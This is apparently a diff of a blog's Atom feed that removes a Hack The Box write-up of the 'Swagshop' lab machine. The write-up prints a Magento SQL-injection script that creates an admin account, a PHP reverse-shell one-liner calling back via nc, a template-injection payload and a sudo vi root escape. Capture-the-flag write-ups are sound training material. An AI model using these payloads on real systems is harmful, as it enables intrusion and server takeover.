/><published>2019-09-28T00:00:00+02:00</published><updated>2019-09-28T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/swagshop</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/swagshop/">&lt;hr /&gt;
-
-&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;Hey guys, today Swagshop retired and here’s my write-up about it. It was a very easy box, it had an outdated version of Magento which had a lot of vulnerabilities that allowed me to get command execution. The user could run &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; as root so I used the basic vi/vim escape to get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.140&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;swagshop.htb&lt;/code&gt;. Let’s jump right in !
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/0.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/swagshop# nmap -sV -sT -sC -o nmapinitial swagshop.htb 
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-27 15:27 EET
-Nmap scan report for swagshop.htb (10.10.10.140)
-Host is up (0.23s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
-|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
-|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Did not follow redirect to http://10.10.10.140/
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 64.69 seconds
-root@kali:~/Desktop/HTB/boxes/swagshop# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and ssh. Let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;web-enumeration-creating-an-admin-user&quot;&gt;Web Enumeration, Creating an admin user&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://swagshop.htb/&lt;/code&gt; :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;On port 80 there’s a web application called &lt;a href=&quot;https://magento.com/&quot;&gt;Magento&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Magento is an open-source e-commerce platform written in PHP. It is one of the most popular open e-commerce systems in the network. This software is created using the Zend Framework. -&lt;a href=&quot;https://en.wikipedia.org/wiki/Magento&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;br /&gt;By looking at the bottom I saw that the version is from 2014 which is very outdated, so I searched for exploits and &lt;a href=&quot;https://www.exploit-db.com/exploits/37977&quot;&gt;this one&lt;/a&gt; which creates a new admin user worked, but I had to edit it first.
-&lt;br /&gt;By browsing the web application I noticed that all paths are after &lt;code class=&quot;highlighter-rouge&quot;&gt;/index.php&lt;/code&gt;, for example the login page :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://swagshop.htb/index.php/customer/account/login/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;So I set the target to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://swagshop.htb/index.php&lt;/code&gt; and I changed the credentials from &lt;code class=&quot;highlighter-rouge&quot;&gt;forme : forme&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;rick : rick&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://swagshop.htb/index.php&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startswith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endswith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;target_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/admin/Cms_Wysiwyg/directive/index/&quot;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
-SET @SALT = 'rp';
-SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
-SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
-INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
-INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
-&quot;&quot;&quot;&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rick&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rick&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pfilter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;popularity[from]=0&amp;amp;popularity[to]=3&amp;amp;popularity[field_expr]=0);{0}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-                  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;___directive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                        &lt;span class=&quot;s&quot;&gt;&quot;filter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pfilter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-                        &lt;span class=&quot;s&quot;&gt;&quot;forwarded&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;WORKED&quot;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Check {0}/admin with creds rick:rick&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;DID NOT WORK&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/swagshop# python 37977.py 
-WORKED
-Check http://swagshop.htb/index.php/admin with creds rick:rick
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/4.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;rce-the-froghopper-attack-user-flag&quot;&gt;RCE (The Froghopper Attack), User Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;This machine had several paths for getting RCE but it has been patched several times and now the only method I could use is an attack called froghopper. 
-&lt;br /&gt;As demonstrated in &lt;a href=&quot;https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper&quot;&gt;this article&lt;/a&gt; I started by allowing symlinks in template settings :
-&lt;br /&gt;System –&amp;gt; Configuration :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Advanced –&amp;gt; Developer :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/6.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; Template Settings –&amp;gt; Allow Symlinks :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/7.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Then I got a blank &lt;code class=&quot;highlighter-rouge&quot;&gt;png&lt;/code&gt; image and echoed a &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; reverse shell to it :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/swagshop# echo '&amp;lt;?php' &amp;gt;&amp;gt; shell.php.png
-root@kali:~/Desktop/HTB/boxes/swagshop# echo 'passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f&quot;);' &amp;gt;&amp;gt; shell.php.png
-root@kali:~/Desktop/HTB/boxes/swagshop# echo '?&amp;gt;' &amp;gt;&amp;gt; shell.php.png
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I uploaded the image as a category thumbnail :
-&lt;br /&gt;Catalog –&amp;gt; Manage Categories :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/10.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Now if we check &lt;code class=&quot;highlighter-rouge&quot;&gt;/media/catalog/category/shell.php.png&lt;/code&gt; the image should be there :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/11.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Last step is to create the newsletter template and inject the payload :
-&lt;br /&gt;Newsletter –&amp;gt; Newsletter Templates :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/13.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/14.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I saved the template and clicked on the preview template button :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/15.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;And I got a shell :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;We owned user.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;privilege-escalation-root-flag&quot;&gt;Privilege Escalation, Root Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;First thing I did after getting a shell was to get a stable tty shell :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; and found that &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; can run &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt; as root on any file in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@swagshop:/var/www/html$ sudo -l 
-Matching Defaults entries for www-data on swagshop:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on swagshop:
-    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
-www-data@swagshop:/var/www/html$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;So I opened &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; in vi as root :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/index.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I executed &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; from vi :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/18.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/swagshop/19.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;And we owned root !
-&lt;br /&gt;That’s it , Feedback is appreciated !
-&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
-&lt;br /&gt;Thanks for reading.
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/kryptos/&quot;&gt;Hack The Box - Kryptos&lt;/a&gt;
-&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ghoul/&quot;&gt;Hack The Box - Ghoul&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="php" /><summary type="html">Quick Summary Hey guys, today Swagshop retired and here’s my write-up about it. It was a very easy box, it had an outdated version of Magento which had a lot of vulnerabilities that allowed me to get command execution. The user could run vi with sudo as root so I used the basic vi/vim escape to get a root shell. It’s a Linux box and its ip is 10.10.10.140, I added it to /etc/hosts as swagshop.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/swagshop# nmap -sV -sT -sC -o nmapinitial swagshop.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-27 15:27 EET Nmap scan report for swagshop.htb (10.10.10.140) Host is up (0.23s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA) | 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA) |_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://10.10.10.140/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/swagshop/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="ssh" /><category term="git" /><category term="networking" /><category term="pivoting" /><summary type="html">Quick Summary Hey guys, today Ghoul retired and here’s my write-up about it. It was a very hard box with a lot of rabbit holes, tons of enumeration and a lot of pivoting. However I enjoyed most parts of the box and learned some new stuff. It’s a Linux box and its ip is 10.10.10.101, I added it to /etc/hosts as ghoul.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/ghoul# nmap -sV -sT -sC -o nmapinitial ghoul.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-04 12:47 EET Nmap scan report for ghoul.htb (10.10.10.101) Host is up (0.22s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA) |_ 256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Aogiri Tree 2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA) | 256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA) | 256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519) 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=Aogiri |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 - Error report Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/ghoul/0.png" /></entry></feed>
